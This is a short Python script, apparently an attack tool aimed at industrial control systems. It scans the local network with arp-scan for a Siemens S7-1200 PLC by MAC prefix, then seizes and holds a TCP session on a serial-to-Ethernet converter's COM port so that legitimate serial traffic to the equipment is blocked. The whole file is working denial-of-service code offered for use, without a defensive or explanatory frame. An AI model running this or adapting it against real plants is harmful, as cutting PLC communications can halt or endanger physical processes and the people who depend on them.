import socket
import re
import subprocess

def find_plc_ip():
    # Use arp-scan or nmap to find the PLC's IP address on the network
    # Example command: arp-scan --localnet
    try:
        result = subprocess.run(['arp-scan', '--localnet'], capture_output=True, text=True)
        output = result.stdout
        # Search for the Siemens S7-1200 PLC MAC address prefix (e.g., 00:1C:1D)
        plc_ip = re.search(r'(\d+\.\d+\.\d+\.\d+)\s+00:1C:1D', output)
        if plc_ip:
            return plc_ip.group(1)
        else:
            print("PLC IP address not found.")
            return None
    except Exception as e:
        print(f"Error finding PLC IP: {e}")
        return None

def block_serial_com(ip, port):
    try:
        # Create a TCP socket and connect to the serial-to-Ethernet converter
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)  # Set a timeout for the connection
        sock.connect((ip, port))
        print(f"TCP session established with {ip}:{port}. Serial COM is blocked.")
        # Hold the connection open indefinitely
        while True:
            pass
    except Exception as e:
        print(f"Error blocking serial COM: {e}")
    finally:
        sock.close()

if __name__ == "__main__":
    # Serial-to-Ethernet converter IP address
    converter_ip = "10.0.0.1"
    # Port corresponding to the serial COM port to block (e.g., 20001 for COM1)
    port_to_block = 20001

    # Find the PLC's IP address
    plc_ip = find_plc_ip()
    if plc_ip:
        print(f"Found PLC IP: {plc_ip}")
        # Block the specified serial COM port
        block_serial_com(converter_ip, port_to_block)
    else:
        print("Could not proceed without the PLC's IP address.")